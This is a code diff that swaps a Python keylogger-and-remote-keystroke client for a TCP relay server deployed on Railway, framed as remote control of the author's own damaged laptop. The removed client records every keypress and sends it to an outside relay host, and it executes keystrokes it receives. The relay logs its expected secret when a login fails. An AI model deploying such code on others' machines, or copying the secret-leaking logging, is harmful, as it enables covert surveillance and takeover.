@@ -1,185 +1,160 @@
 #!/usr/bin/env python3
 """
-remote_server.py - Run this on the DAMAGED laptop (the far away one)
-It connects OUT to your Railway relay server.
-Sends keylogs + receives and executes remote keystrokes.
-
-Requirements: pip install pynput
+relay_server.py - Deploy this on Railway.app
+Fixed version with detailed logging to help debug connection issues.
 """
 
 import socket
 import threading
-import json
-import sys
 import os
 import time
+import json
 
-try:
-    from pynput.keyboard import Key, Controller
-    from pynput import keyboard as kb
-except ImportError:
-    print("Installing pynput...")
-    os.system(f"{sys.executable} -m pip install pynput")
-    from pynput.keyboard import Key, Controller
-    from pynput import keyboard as kb
+HOST = "0.0.0.0"
+PORT = int(os.environ.get("PORT", 55000))
+SECRET = os.environ.get("RELAY_SECRET", "changeme123")
 
-# ─── CONFIG ─────────────────────────────────────────────
-RELAY_HOST = "turntable.proxy.rlwy.net"  # ← change this
-RELAY_PORT = 11654                               # ← change if Railway assigns different
-SECRET      = "mysecret99"                      # ← must match relay server
-# ────────────────────────────────────────────────────────
+damaged_conn = None
+controller_conn = None
+conn_lock = threading.Lock()
 
-keyboard = Controller()
-sock = None
-reconnect_delay = 5
+def log(msg):
+    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)
 
-SPECIAL_KEYS = {
-    "enter": Key.enter, "backspace": Key.backspace, "space": Key.space,
-    "tab": Key.tab, "esc": Key.esc, "escape": Key.esc,
-    "up": Key.up, "down": Key.down, "left": Key.left, "right": Key.right,
-    "delete": Key.delete, "home": Key.home, "end": Key.end,
-    "page_up": Key.page_up, "page_down": Key.page_down,
-    "f1": Key.f1, "f2": Key.f2, "f3": Key.f3, "f4": Key.f4,
-    "f5": Key.f5, "f6": Key.f6, "f7": Key.f7, "f8": Key.f8,
-    "f9": Key.f9, "f10": Key.f10, "f11": Key.f11, "f12": Key.f12,
-    "ctrl": Key.ctrl, "ctrl_l": Key.ctrl_l, "ctrl_r": Key.ctrl_r,
-    "alt": Key.alt, "alt_l": Key.alt_l, "alt_r": Key.alt_r,
-    "shift": Key.shift, "caps_lock": Key.caps_lock, "cmd": Key.cmd,
-    "win": Key.cmd,
-}
-
-KEY_DISPLAY_MAP = {
-    kb.Key.enter: "[ENTER]", kb.Key.backspace: "[BACKSPACE]",
-    kb.Key.space: " ", kb.Key.tab: "[TAB]", kb.Key.esc: "[ESC]",
-    kb.Key.up: "[UP]", kb.Key.down: "[DOWN]",
-    kb.Key.left: "[LEFT]", kb.Key.right: "[RIGHT]",
-    kb.Key.delete: "[DELETE]", kb.Key.caps_lock: "[CAPS]",
-    kb.Key.shift: "[SHIFT]", kb.Key.shift_l: "[SHIFT]", kb.Key.shift_r: "[SHIFT]",
-    kb.Key.ctrl_l: "[CTRL]", kb.Key.ctrl_r: "[CTRL]",
-    kb.Key.alt_l: "[ALT]", kb.Key.alt_r: "[ALT]",
-    kb.Key.home: "[HOME]", kb.Key.end: "[END]",
-    kb.Key.page_up: "[PGUP]", kb.Key.page_down: "[PGDN]",
-}
-
-def send(event: dict):
-    global sock
-    if sock:
-        try:
-            sock.sendall((json.dumps(event) + "\n").encode("utf-8"))
-        except Exception as e:
-            print(f"[Send error] {e}")
-
-def handle_event(data):
+def send_json(conn, data: dict):
     try:
-        event = json.loads(data)
-        action = event.get("action")
-        key_str = event.get("key", "")
-
-        if action == "type":
-            keyboard.type(key_str)
-        elif action == "press":
-            key = SPECIAL_KEYS.get(key_str.lower())
-            if key:
-                keyboard.press(key)
-            elif len(key_str) == 1:
-                keyboard.press(key_str)
-        elif action == "release":
-            key = SPECIAL_KEYS.get(key_str.lower())
-            if key:
-                keyboard.release(key)
-            elif len(key_str) == 1:
-                keyboard.release(key_str)
-        elif action == "hotkey":
-            keys = [SPECIAL_KEYS.get(k.lower(), k) for k in key_str.split("+")]
-            for k in keys: keyboard.press(k)
-            for k in reversed(keys): keyboard.release(k)
+        msg = json.dumps(data) + "\n"
+        conn.sendall(msg.encode("utf-8"))
+        return True
     except Exception as e:
-        print(f"[Event error] {e}")
+        log(f"[send_json error] {e}")
+        return False
 
-def start_keylogger():
-    def on_press(key):
-        char = KEY_DISPLAY_MAP.get(key)
-        if char is None:
-            if hasattr(key, "char") and key.char:
-                char = key.char
-            else:
-                char = f"[{key}]"
-        send({"keylog": char})
+def recv_line(conn, timeout=15):
+    """Read until newline with timeout."""
+    conn.settimeout(timeout)
+    buf = b""
+    try:
+        while b"\n" not in buf:
+            chunk = conn.recv(1)
+            if not chunk:
+                return None
+            buf += chunk
+        return buf.decode("utf-8").strip()
+    except Exception as e:
+        log(f"[recv_line error] {e}")
+        return None
+    finally:
+        conn.settimeout(None)
 
-    listener = kb.Listener(on_press=on_press)
-    listener.daemon = True
-    listener.start()
-    print("[Keylogger] Capturing physical keypresses...")
+def handle_client(conn, addr):
+    global damaged_conn, controller_conn
+    log(f"New connection from {addr[0]}:{addr[1]}")
+    role = None
 
-def receive_loop():
-    global sock
-    buffer = ""
-    while True:
-        try:
-            data = sock.recv(4096).decode("utf-8")
-            if not data:
-                break
-            buffer += data
-            while "\n" in buffer:
-                line, buffer = buffer.split("\n", 1)
-                line = line.strip()
-                if line:
-                    try:
-                        msg = json.loads(line)
-                        # Ignore relay status messages
-                        if "status" in msg:
-                            print(f"[Relay] {msg.get('msg', '')}")
-                        elif "action" in msg:
-                            handle_event(line)
-                    except:
-                        pass
-        except Exception as e:
-            print(f"[Receive error] {e}")
-            break
-
-def connect_with_retry():
-    global sock
-    while True:
-        try:
-            print(f"[*] Connecting to relay: {RELAY_HOST}:{RELAY_PORT}...")
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((RELAY_HOST, RELAY_PORT))
-
-            # Authenticate
-            auth = json.dumps({"secret": SECRET, "role": "damaged"}) + "\n"
-            sock.sendall(auth.encode("utf-8"))
-
-            # Wait for OK
-            resp = sock.recv(1024).decode("utf-8").strip()
-            msg = json.loads(resp)
-            if msg.get("status") != "ok":
-                print(f"[Auth failed] {msg.get('msg')}")
-                sock.close()
-                time.sleep(reconnect_delay)
-                continue
-
-            print("[+] Connected to relay server!")
-            print("[+] Waiting for controller to connect...")
+    try:
+        # Read auth line
+        raw = recv_line(conn, timeout=15)
+        if raw is None:
+            log(f"No auth received from {addr[0]} - closing")
             return
 
+        log(f"Auth received from {addr[0]}: {raw[:80]}")
+
+        try:
+            msg = json.loads(raw)
         except Exception as e:
-            print(f"[Connection failed] {e} — retrying in {reconnect_delay}s...")
-            time.sleep(reconnect_delay)
+            log(f"JSON parse error from {addr[0]}: {e} | raw: {repr(raw)}")
+            send_json(conn, {"status": "error", "msg": "Invalid JSON"})
+            return
+
+        if msg.get("secret") != SECRET:
+            log(f"Wrong secret from {addr[0]}. Got: {repr(msg.get('secret'))} Expected: {repr(SECRET)}")
+            send_json(conn, {"status": "error", "msg": "Wrong secret"})
+            return
+
+        role = msg.get("role")
+        if role not in ("damaged", "controller"):
+            send_json(conn, {"status": "error", "msg": "Role must be damaged or controller"})
+            return
+
+        with conn_lock:
+            if role == "damaged":
+                if damaged_conn:
+                    try: damaged_conn.close()
+                    except: pass
+                damaged_conn = conn
+                log(f"Damaged laptop connected from {addr[0]}")
+            else:
+                if controller_conn:
+                    try: controller_conn.close()
+                    except: pass
+                controller_conn = conn
+                log(f"Controller connected from {addr[0]}")
+
+        send_json(conn, {"status": "ok", "role": role, "msg": f"Connected as {role}"})
+        log(f"Auth OK for {role} @ {addr[0]}")
+
+        # Relay loop
+        buffer = ""
+        while True:
+            try:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                buffer += data.decode("utf-8")
+                while "\n" in buffer:
+                    line, buffer = buffer.split("\n", 1)
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        parsed = json.loads(line)
+                    except:
+                        continue
+
+                    with conn_lock:
+                        if role == "damaged" and controller_conn:
+                            send_json(controller_conn, parsed)
+                        elif role == "controller" and damaged_conn:
+                            send_json(damaged_conn, parsed)
+            except Exception as e:
+                log(f"Relay loop error ({role}): {e}")
+                break
+
+    except Exception as e:
+        log(f"handle_client error ({role or 'unknown'} @ {addr[0]}): {e}")
+    finally:
+        with conn_lock:
+            if role == "damaged" and damaged_conn is conn:
+                damaged_conn = None
+                log("Damaged laptop disconnected")
+            elif role == "controller" and controller_conn is conn:
+                controller_conn = None
+                log("Controller disconnected")
+        try:
+            conn.close()
+        except:
+            pass
 
 def main():
-    print("=" * 50)
-    print("  Remote Server - DAMAGED / FAR LAPTOP")
-    print("=" * 50)
-    print(f"  Relay: {RELAY_HOST}:{RELAY_PORT}")
-    print("=" * 50)
+    log(f"Starting relay server on {HOST}:{PORT}")
+    log(f"RELAY_SECRET is {'SET' if SECRET != 'changeme123' else 'NOT SET - using default!'}")
+    log(f"Secret first 3 chars: {SECRET[:3]}...")
 
-    start_keylogger()
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((HOST, PORT))
+    server.listen(10)
+    log(f"Relay server ready and listening on port {PORT}")
 
     while True:
-        connect_with_retry()
-        receive_loop()
-        print(f"[!] Disconnected. Reconnecting in {reconnect_delay}s...")
-        time.sleep(reconnect_delay)
+        try:
+            conn, addr = server.accept()
+            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
+            t.start()
+        except Exception as e:
+            log(f"Accept error: {e}")
 
 if __name__ == "__main__":
     main()
